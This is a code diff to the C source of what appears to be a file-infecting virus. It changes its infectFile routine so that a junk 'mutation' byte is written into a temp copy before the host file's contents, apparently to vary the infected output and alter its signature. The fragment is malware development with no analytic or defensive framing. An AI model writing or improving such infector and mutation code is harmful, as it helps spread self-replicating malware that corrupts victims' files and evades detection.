@@ -149,6 +149,17 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         remove(tempFileName);
         return -1;
     }
+    // Insert byte of useless data (mutation)
+    char mutationByte = 0x00;
+    if (fwrite(&mutationByte, 1, 1, tempFile) != 1) {
+        perror("Could not write mutation byte to infected file");
+        fclose(fileToInfect);
+        fclose(virusFile);
+        fclose(tempFile);
+        remove(tempFileName);
+        return -1;
+    }
+    // Copy original file to temp file
     if (copyFile(fileToInfect, tempFile, 0, EOF) < 0) {
         printf("Could not copy infected file to temp file\n");
         fclose(fileToInfect);
@@ -179,16 +190,6 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         printf("Could not copy temp file to infected file\n");
         fclose(fileToInfect);
         fclose(tempFile);
-        return -1;
-    }
-
-    // Insert byte of useless data (mutation)
-    char mutationByte = 0x00;
-    if (fwrite(&mutationByte, 1, 1, fileToInfect) != 1) {
-        perror("Could not write mutation byte to infected file");
-        fclose(fileToInfect);
-        fclose(tempFile);
-        remove(tempFileName);
         return -1;
     }
 
